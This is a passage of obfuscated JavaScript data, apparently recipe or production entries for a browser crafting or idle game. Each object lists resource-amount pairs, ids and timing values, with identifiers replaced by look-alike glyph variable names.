			id: ᐃᐃⲆ.ΔΔⵠⵠᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔΔⵠⵠᐃ,
			time: .2,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, ⵠⵠⵠⲆᐃ]
			],
			w: 1,
			f: Δⵠᐃ,
			"ᐃⲆΔ": Δᐃᐃᐃ,
			e: 0,
			id: ᐃᐃⲆ.ⲆΔΔⵠᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆΔΔⵠᐃ,
			time: ⵠΔᐃ / ⲆⲆΔⵠ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ⲆΔΔⵠᐃ, 1],
				[ᐃᐃ.ᐃᐃΔⲆ, ΔΔΔᐃᐃⵠΔ]
			],
			w: ᐃΔᐃⲆ,
			f: 0,
			"ᐃⲆΔ": 0,
			e: ΔⲆⵠⲆ,
			id: ᐃᐃⲆ.ΔⵠΔⲆⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔⵠΔⲆⲆ,
			time: ⲆⵠⲆⲆ / 5,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ΔⵠΔⲆⲆ, 1],
				[ᐃᐃ.ΔⲆⵠⵠ, 14]
			],
			w: ⵠᐃⵠΔ,
			f: 0,
			"ᐃⲆΔ": 0,
			e: ᐃⵠⲆ,
			id: ᐃᐃⲆ.ⲆᐃᐃΔⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆᐃᐃΔⲆ,
			time: 1 / ⵠⵠΔⵠ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ⲆᐃᐃΔⲆ, 1],
				[ᐃᐃ.ΔⲆᐃΔ, ᐃⵠΔⵠΔΔᐃ]
			],
			w: ΔΔΔ,
			f: 0,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ⲆΔⲆᐃᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆΔⲆᐃᐃ,
			time: ᐃᐃⵠ / ⵠⵠΔΔ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ⲆΔⲆᐃᐃ, 1],
				[ᐃᐃ.ⲆⵠΔⲆ, ΔᐃΔⲆⲆ]
			],
			w: ΔΔΔ,
			f: 0,
			"ᐃⲆΔ": ᐃⵠΔ,
			e: ᐃⵠΔ,
			id: ᐃᐃⲆ.ᐃΔᐃΔⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃΔᐃΔⵠ,
			time: ⵠⲆΔ / 5,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ᐃΔᐃΔⵠ, 1],
				[ᐃᐃ.ⲆΔᐃᐃ, ⲆⲆΔⵠ]
			],
			w: ΔΔΔ,
			f: Δⵠᐃ,
			"ᐃⲆΔ": ΔⲆⵠⲆ,
			e: 0,
			id: ᐃᐃⲆ.ΔᐃΔᐃⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔᐃΔᐃⵠ,
			time: ᐃΔᐃⲆ / 5,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 30]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ΔⲆⵠⲆ,
			e: ᐃⵠΔ,
			id: ᐃᐃⲆ.ⵠᐃᐃⵠᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠᐃᐃⵠᐃ,
			time: 1 / ⵠⲆⲆΔΔ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠᐃᐃⵠᐃ, ΔⲆᐃᐃ],
				[ᐃᐃ.ᐃᐃΔⲆ, 27]
			],
			w: ΔΔΔ,
			f: ⵠⲆᐃⵠ,
			"ᐃⲆΔ": 0,
			e: ᐃⵠⲆ,
			id: ᐃᐃⲆ.ⲆΔⵠΔΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆΔⵠΔΔ,
			time: .125,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ⲆΔⵠΔΔ, 1],
				[ᐃᐃ.ΔⲆⵠⵠ, 24]
			],
			w: ⵠⲆΔ,
			f: ΔΔⵠ,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ⵠᐃⵠⵠᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠᐃⵠⵠᐃ,
			time: 1 / ΔᐃᐃⲆᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠᐃⵠⵠᐃ, 1],
				[ᐃᐃ.ΔⲆᐃΔ, 21]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ΔᐃΔΔ,
			e: ᐃⵠΔ,
			id: ᐃᐃⲆ.ⵠⵠⵠᐃⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⵠⵠᐃⲆ,
			time: 1 / 8,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⵠⵠᐃⲆ, 1],
				[ᐃᐃ.ⲆⵠΔⲆ, ᐃᐃΔᐃⲆⵠᐃ]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ⲆⲆⲆⲆⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⲆⲆⲆⲆ,
			time: 1 / ⵠⵠᐃΔⲆ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ⲆⲆⲆⲆⲆ, 1],
				[ᐃᐃ.ⲆΔᐃᐃ, ᐃⲆⵠⵠᐃ]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": 0,
			e: ⲆΔⵠ,
			id: ᐃᐃⲆ.ⵠⲆΔΔⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⲆΔΔⵠ,
			time: .125,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ⲆΔΔⵠᐃ, ᐃⲆᐃ],
				[ᐃᐃ.ⵠⲆⲆᐃ, 40],
				[ᐃᐃ.ᐃᐃΔⲆ, 30]
			],
			w: ΔΔΔ,
			f: ⲆⲆⲆᐃ,
			"ᐃⲆΔ": ⲆΔⵠ,
			e: 0,
			id: ᐃᐃⲆ.ⵠⵠⵠΔⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⵠⵠΔⲆ,
			time: ᐃΔᐃⲆ / 20,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ΔⵠΔⲆⲆ, ΔΔΔ],
				[ᐃᐃ.ᐃᐃΔⲆ, 70]
			],
			w: ᐃᐃⲆΔ,
			f: 0,
			"ᐃⲆΔ": ⵠΔⲆⵠ,
			e: ΔⲆⲆ,
			id: ᐃᐃⲆ.ⲆΔᐃΔᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆΔᐃΔᐃ,
			time: .05,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ⲆᐃᐃΔⲆ, 1],
				[ᐃᐃ.ΔⲆⵠⵠ, 40],
				[ᐃᐃ.ᐃᐃΔⲆ, 30]
			],
			w: 1,
			f: ΔⲆⵠⲆ,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ⲆΔⲆⵠΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆΔⲆⵠΔ,
			time: 1 / ᐃΔⲆⵠᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ⲆΔⲆᐃᐃ, 1],
				[ᐃᐃ.ΔⲆᐃΔ, 40],
				[ᐃᐃ.ᐃᐃΔⲆ, 30]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ΔᐃΔΔ,
			e: 0,
			id: ᐃᐃⲆ.ⲆⲆΔⵠⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⲆΔⵠⲆ,
			time: ⵠⲆΔ / ᐃᐃⵠⵠⲆ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ᐃΔᐃΔⵠ, ΔⲆᐃᐃ],
				[ᐃᐃ.ⲆⵠΔⲆ, 40],
				[ᐃᐃ.ᐃᐃΔⲆ, 30]
			],
			w: ⵠΔᐃ,
			f: ⲆΔⵠ,
			"ᐃⲆΔ": ΔᐃΔΔ,
			e: 0,
			id: ᐃᐃⲆ.ΔⲆⵠⵠᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔⲆⵠⵠᐃ,
			time: 1 / 20,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ΔᐃΔᐃⵠ, ⵠΔΔ],
				[ᐃᐃ.ⲆΔᐃᐃ, 40],
				[ᐃᐃ.ΔⲆⵠⵠ, 30]
			],
			w: ⵠΔᐃ,
			f: ⵠⲆⲆ,
			"ᐃⲆΔ": ΔⲆⲆ,
			e: 0,
			id: ᐃᐃⲆ.ⵠᐃⲆᐃⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠᐃⲆᐃⲆ,
			time: ΔΔΔ / 20,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠᐃᐃⵠᐃ, ⵠΔΔ],
				[ᐃᐃ.ⵠⲆⲆᐃ, 80],
				[ᐃᐃ.ᐃᐃΔⲆ, 60]
			],
			w: 1,
			f: ᐃΔΔ,
			"ᐃⲆΔ": ΔΔⵠ,
			e: 0,
			id: ᐃᐃⲆ.ᐃᐃΔΔⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃᐃΔΔⲆ,
			time: ⵠΔⲆ / ⵠⵠⵠⲆᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ⲆΔⵠΔΔ, ᐃᐃⲆΔ],
				[ᐃᐃ.ᐃᐃΔⲆ, 140]
			],
			w: ΔⲆᐃᐃ,
			f: 0,
			"ᐃⲆΔ": ⵠΔⲆⵠ,
			e: 0,
			id: ᐃᐃⲆ.ⲆⲆΔⵠⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⲆΔⵠⵠ,
			time: .05,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠᐃⵠⵠᐃ, 1],
				[ᐃᐃ.ΔⲆⵠⵠ, 80],
				[ᐃᐃ.ᐃᐃΔⲆ, 60]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ⲆⲆⲆᐃ,
			e: 0,
			id: ᐃᐃⲆ.ⲆᐃΔΔⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆᐃΔΔⲆ,
			time: 1 / ⲆⵠᐃᐃⲆ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⵠⵠᐃⲆ, 1],
				[ᐃᐃ.ΔⲆᐃΔ, 80],
				[ᐃᐃ.ᐃᐃΔⲆ, 60]
			],
			w: Ⲇᐃⵠ,
			f: ᐃⵠΔ,
			"ᐃⲆΔ": 0,
			e: ᐃⵠⲆ,
			id: ᐃᐃⲆ.ⲆⵠⲆᐃᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⵠⲆᐃᐃ,
			time: 1 / ⲆᐃᐃΔΔ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ⲆⲆⲆⲆⲆ, ᐃⲆᐃ],
				[ᐃᐃ.ⲆⵠΔⲆ, 80],
				[ᐃᐃ.ᐃᐃΔⲆ, 60]
			],
			w: ΔⲆᐃᐃ,
			f: 0,
			"ᐃⲆΔ": Δᐃᐃᐃ,
			e: ᐃⵠⲆ,
			id: ᐃᐃⲆ.ⵠΔⵠᐃⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠΔⵠᐃⲆ,
			time: 1 / ⵠΔΔⲆⲆ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆΔΔⵠ, ⵠΔΔ],
				[ᐃᐃ.ⲆΔᐃᐃ, 80],
				[ᐃᐃ.ΔⲆⵠⵠ, 60]
			],
			w: ⵠᐃⵠΔ,
			f: 0,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ⵠⵠⲆΔⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⵠⲆΔⵠ,
			time: 1 / ΔᐃⲆⵠᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 25],
				[ᐃᐃ.ΔⲆⵠⵠ, 2]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ᐃΔΔ,
			e: ⵠⲆⲆ,
			id: ᐃᐃⲆ.ⵠⵠⵠᐃⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⵠⵠᐃⵠ,
			time: ᐃᐃⲆΔ / ⲆΔⲆᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠΔⵠΔⲆ, 1],
				[ᐃᐃ.ⲆᐃⵠⲆᐃ, 1],
				[ᐃᐃ.ᐃᐃᐃΔΔ, 2]
			],
			w: ⵠΔᐃ,
			f: 0,
			"ᐃⲆΔ": ⵠΔⲆⵠ,
			e: 0,
			id: ᐃᐃⲆ.ΔⵠⲆⵠΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔⵠⲆⵠΔ,
			time: ΔⲆᐃᐃ / 5,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⵠΔⵠΔⲆ, 5],
				[ᐃᐃ.ΔⲆᐃⲆⲆ, ⵠΔΔⲆᐃ],
				[ᐃᐃ.ΔΔΔΔᐃ, ᐃᐃⲆᐃ],
				[ᐃᐃ.ⲆᐃⵠⲆᐃ, ΔⲆΔΔ]
			],
			w: 1,
			f: ⵠΔⲆⵠ,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ᐃⵠΔⲆᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃⵠΔⲆᐃ,
			time: ⵠⲆΔ / 30,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ΔⵠΔΔᐃᐃᐃ, ΔΔΔ],
				[ᐃᐃ.ⵠᐃⲆᐃᐃ, 8],
				[ᐃᐃ.ᐃⲆΔᐃΔ, 8],
				[ᐃᐃ.ΔⲆᐃⲆⲆ, 8],
				[ᐃᐃ.ᐃᐃᐃΔΔ, ΔᐃⲆᐃ]
			],
			w: ᐃᐃⲆΔ,
			f: ⲆΔⵠ,
			"ᐃⲆΔ": ᐃⵠⲆ,
			e: 0,
			id: ᐃᐃⲆ.ⵠⲆⵠΔⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⲆⵠΔⵠ,
			time: .016666666666666666,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⲆᐃⵠⲆᐃ, 1],
				[ᐃᐃ.ᐃᐃᐃΔΔ, 2]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": Δᐃᐃᐃ,
			e: ΔⲆⵠⲆ,
			id: ᐃᐃⲆ.ΔⵠᐃⲆⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔⵠᐃⲆⵠ,
			time: .2,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ΔⵠᐃⲆⵠ, ⵠΔΔ],
				[ᐃᐃ.ΔᐃᐃᐃΔ, ⲆΔⲆᐃ],
				[ᐃᐃ.ᐃᐃᐃΔΔ, ⵠⲆⵠᐃ]
			],
			w: ⵠΔᐃ,
			f: 0,
			"ᐃⲆΔ": ΔᐃΔΔ,
			e: 0,
			id: ᐃᐃⲆ.ᐃᐃⲆⵠᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃᐃⲆⵠᐃ,
			time: ⵠⲆΔ / ᐃⲆⲆΔⵠ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ᐃᐃⲆⵠᐃ, 1],
				[ᐃᐃ.ᐃⲆΔⲆⲆ, 5],
				[ᐃᐃ.ΔΔΔΔᐃ, ᐃⵠⵠΔ]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": Δᐃᐃᐃ,
			e: ⲆΔⵠ,
			id: ᐃᐃⲆ.ⲆⵠΔᐃⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⵠΔᐃⲆ,
			time: ⲆⵠⲆⲆ / 30,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⲆⵠΔᐃⲆ, ⵠΔΔ],
				[ᐃᐃ.ᐃⲆΔⲆⲆ, ᐃΔΔΔ],
				[ᐃᐃ.ⵠⲆᐃΔΔ, ⵠᐃⲆⲆΔ],
				[ᐃᐃ.ΔΔΔΔᐃ, ⲆⵠᐃΔ]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ΔᐃⲆⵠΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔᐃⲆⵠΔ,
			time: ᐃᐃⵠ / 50,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 50]
			],
			w: 0,
			f: Δⵠᐃ,
			"ᐃⲆΔ": ⵠⲆᐃⵠ,
			e: ⵠⲆᐃⵠ,
			id: ᐃᐃⲆ.ᐃⵠⵠⲆΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃⵠⵠⲆΔ,
			time: .2,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ᐃᐃΔⲆ, 75],
				[ᐃᐃ.ⵠⲆⲆᐃ, 75],
				[ᐃᐃ.ᐃⵠⵠⲆΔ, 1]
			],
			w: ⲆⵠⲆⲆ,
			f: 0,
			"ᐃⲆΔ": ΔΔⵠ,
			e: ⲆⲆⲆᐃ,
			id: ᐃᐃⲆ.ⵠΔΔᐃⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠΔΔᐃⲆ,
			time: 1 / ᐃΔⲆᐃⵠ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ᐃᐃΔⲆ, 90],
				[ᐃᐃ.ⵠⲆⲆᐃ, 90],
				[ᐃᐃ.ΔⲆⵠⵠ, 90],
				[ᐃᐃ.ⵠΔΔᐃⲆ, 1]
			],
			w: ᐃᐃⲆΔ,
			f: 0,
			"ᐃⲆΔ": 0,
			e: ᐃⵠⲆ,
			id: ᐃᐃⲆ.ⲆⵠⲆⵠΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⵠⲆⵠΔ,
			time: ⵠΔⲆ / ΔΔⲆⵠᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ᐃᐃΔⲆ, 100],
				[ᐃᐃ.ΔⲆⵠⵠ, ⵠⵠΔᐃᐃ],
				[ᐃᐃ.ΔⲆᐃΔ, 100],
				[ᐃᐃ.ⲆⵠⲆⵠΔ, ⵠᐃⵠΔ]
			],
			w: ᐃⲆᐃ,
			f: 0,
			"ᐃⲆΔ": 0,
			e: Δⵠᐃ,
			id: ᐃᐃⲆ.ᐃΔⲆⲆⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃΔⲆⲆⲆ,
			time: 1 / 30,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⲆⵠΔⲆ, 80],
				[ᐃᐃ.ΔⲆⵠⵠ, 150],
				[ᐃᐃ.ΔⲆᐃΔ, 120],
				[ᐃᐃ.ᐃΔⲆⲆⲆ, 1]
			],
			w: 1,
			f: ΔⲆⵠⲆ,
			"ᐃⲆΔ": 0,
			e: Δⵠᐃ,
			id: ᐃᐃⲆ.ⲆⵠΔⲆΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⵠΔⲆΔ,
			time: ΔⲆⵠ / 60,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⲆΔᐃᐃ, 80],
				[ᐃᐃ.ΔⲆᐃΔ, 150],
				[ᐃᐃ.ⲆⵠΔⲆ, 120],
				[ᐃᐃ.ⲆⵠΔⲆΔ, ᐃΔᐃⲆ]
			],
			w: ⵠΔΔ,
			f: 1,
			"ᐃⲆΔ": 0,
			e: ⲆΔⵠ,
			id: ᐃᐃⲆ.ⵠⵠⲆⲆᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⵠⲆⲆᐃ,
			time: ⵠⲆΔ / 90,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⲆⲆⲆᐃᐃ, ⲆᐃᐃⲆ],
				[ᐃᐃ.ΔⲆᐃΔ, 40],
				[ᐃᐃ.ᐃᐃᐃΔΔ, 4]
			],
			w: 1,
			f: ⵠⲆⲆ,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ᐃⲆΔΔⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃⲆΔΔⵠ,
			time: ⵠΔⲆ / ⲆⵠᐃᐃⲆ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ᐃⲆΔΔⵠ, 1],
				[ᐃᐃ.ΔⲆⵠⵠ, 80],
				[ᐃᐃ.ᐃⲆᐃⲆᐃ, ᐃᐃⲆΔ],
				[ᐃᐃ.ⲆⵠΔⲆ, 20]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ᐃⵠⲆ,
			e: Δᐃᐃᐃ,
			id: ᐃᐃⲆ.ΔⵠᐃΔⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔⵠᐃΔⲆ,
			time: .011111111111111112,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ΔⵠᐃᐃΔ, 5],
				[ᐃᐃ.ΔⲆᐃΔ, 50],
				[ᐃᐃ.ΔΔΔΔᐃ, 5]
			],
			w: 1,
			f: 1,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ᐃⵠᐃⲆⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃⵠᐃⲆⲆ,
			time: .05,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ᐃⵠᐃⲆⲆ, 1],
				[ᐃᐃ.ΔⵠᐃᐃΔ, ᐃΔⲆᐃⵠ],
				[ᐃᐃ.ⲆⵠΔⲆ, 50]
			],
			w: ⲆⵠⲆⲆ,
			f: 1,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ᐃᐃΔΔΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃᐃΔΔΔ,
			time: ᐃᐃⲆΔ / 60,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ᐃᐃΔΔΔ, 1],
				[ᐃᐃ.ΔⵠᐃᐃΔ, ΔⲆᐃᐃⲆ],
				[ᐃᐃ.ⲆⵠΔⲆ, 50],
				[ᐃᐃ.ⲆΔᐃᐃ, 50]
			],
			w: 1,
			f: 1,
			"ᐃⲆΔ": ΔΔⵠⵠ,
			e: ᐃⵠⲆ,
			id: ᐃᐃⲆ.ΔⵠⲆΔᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔⵠⲆΔᐃ,
			time: ⵠᐃⵠΔ / 90,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ᐃᐃᐃΔΔ, 4],
				[ᐃᐃ.ΔΔᐃΔᐃ, 2]
			],
			w: ⵠᐃⵠΔ,
			f: 0,
			"ᐃⲆΔ": ⲆΔⵠ,
			e: ᐃΔΔ,
			id: ᐃᐃⲆ.ⲆⲆΔᐃᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⲆΔᐃᐃ,
			time: ᐃᐃⵠ / ᐃⲆⵠⵠᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⲆⲆΔᐃᐃ, 1],
				[ᐃᐃ.ᐃᐃᐃΔΔ, ⲆΔᐃⵠⵠᐃⵠ],
				[ᐃᐃ.ΔΔᐃΔᐃ, 4],
				[ᐃᐃ.ᐃⲆΔᐃΔ, 12],
				[ᐃᐃ.ΔⲆᐃⲆⲆ, 4]
			],
			w: ΔⲆⵠ,
			f: ΔᐃΔΔ,
			"ᐃⲆΔ": 0,
			e: ⲆΔⵠ,
			id: ᐃᐃⲆ.ⲆⲆⵠᐃᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⲆⵠᐃᐃ,
			time: .006666666666666667,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ᐃᐃᐃΔΔ, 6],
				[ᐃᐃ.ΔᐃᐃᐃΔ, ⵠᐃΔⵠ]
			],
			w: ⲆⵠⲆⲆ,
			f: ΔⲆⲆ,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ⵠᐃᐃⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠᐃᐃⵠ,
			time: 1 / ΔⲆᐃᐃⲆ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, ⵠΔΔⲆᐃ]
			],
			w: 0,
			f: 1,
			"ᐃⲆΔ": ΔᐃΔΔ,
			e: ⵠΔⲆⵠ,
			id: ᐃᐃⲆ.ⵠΔⵠΔⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠΔⵠΔⲆ,
			time: ᐃⲆᐃ / ⵠⵠⵠⵠ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ΔⲆᐃΔ, 1],
				[ᐃᐃ.ᐃᐃᐃΔΔ, ΔⲆⵠ]
			],
			w: 1,
			f: ΔΔⵠ,
			"ᐃⲆΔ": ᐃⵠΔ,
			e: 0,
			id: ᐃᐃⲆ.ΔΔΔΔᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔΔΔΔᐃ,
			time: ⵠΔΔ / 3,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ΔⲆⵠⵠ, ⲆΔΔᐃᐃ]
			],
			w: ⵠᐃⵠΔ,
			f: ΔⲆⲆ,
			"ᐃⲆΔ": 0,
			e: ⲆⲆⲆᐃ,
			id: ᐃᐃⲆ.ΔΔΔⵠᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔΔΔⵠᐃ,
			time: ᐃⲆᐃ / ⲆΔⲆᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ΔⲆⵠⵠ, 250]
			],
			w: 1,
			f: ⲆΔⵠ,
			"ᐃⲆΔ": ⵠⲆᐃⵠ,
			e: ⵠⲆⲆ,
			id: ᐃᐃⲆ.ΔⵠΔⵠΔ,
